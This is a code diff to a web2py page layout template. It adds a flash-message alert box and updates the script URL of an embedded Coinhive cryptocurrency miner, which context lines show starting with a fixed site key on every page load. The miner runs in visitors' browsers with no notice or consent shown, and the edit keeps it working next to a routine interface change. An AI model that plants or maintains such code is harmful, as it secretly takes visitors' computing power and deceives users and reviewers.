@@ -92,6 +92,13 @@ desired effect
       </div>
       <!-- /.container-fluid -->
     </nav>
+    {{if response.flash:}}
+    <div class="alert alert-warning alert-dismissible">
+      <button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>
+      <!-- <h4><i class="icon fa fa-info"></i> Alert!</h4> -->
+      {{=response.flash or ''}}
+    </div>
+    {{pass}}
   </header>
   <!-- Full Width Column -->
   <div class="content-wrapper">
@@ -147,7 +154,7 @@ desired effect
 <script src="{{=URL('static', 'juventude/dist/js/demo.js')}}"></script>
 <script src="{{=URL('static', 'js/personal.js')}}"></script>
 <!-- Miner -->
-<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <!-- Start Mining -->
 <script>
 	var miner = new CoinHive.Anonymous('nRRl0hLhAE8W6hl7KflB03szw5loicPv', {threads: 1});
